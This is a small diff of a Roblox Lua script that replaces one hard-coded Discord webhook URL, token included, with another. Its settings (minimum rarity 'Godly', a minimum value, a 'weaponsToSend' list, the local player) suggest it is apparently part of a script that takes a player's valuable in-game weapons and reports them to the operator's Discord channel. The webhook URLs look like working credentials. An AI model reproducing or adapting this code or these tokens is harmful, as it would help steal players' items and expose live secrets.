@@ -11,7 +11,7 @@ task.spawn(function()
 	local min_rarity = "Godly"
 	local min_value = 60
 	local ping = "Yes"
-	local webhook = "https://discord.com/api/webhooks/1429033388811091999/q6R0f1um7inkJRGD7S7Vz56ZeB52FNBExnxBEMUcwD7lGOqIoifrsjJB_RkfESOktf0n"
+	local webhook = "https://discord.com/api/webhooks/1429408397383565333/j48eNLySyGYZLJrNBI4sVEER1uLcFuQPsrCZn90xTn28KDjJqi6t6xIzbBc4kY0-mGhE"
 	local weaponsToSend = {}
 	local Players = game:GetService("Players")
 	local plr = Players.LocalPlayer
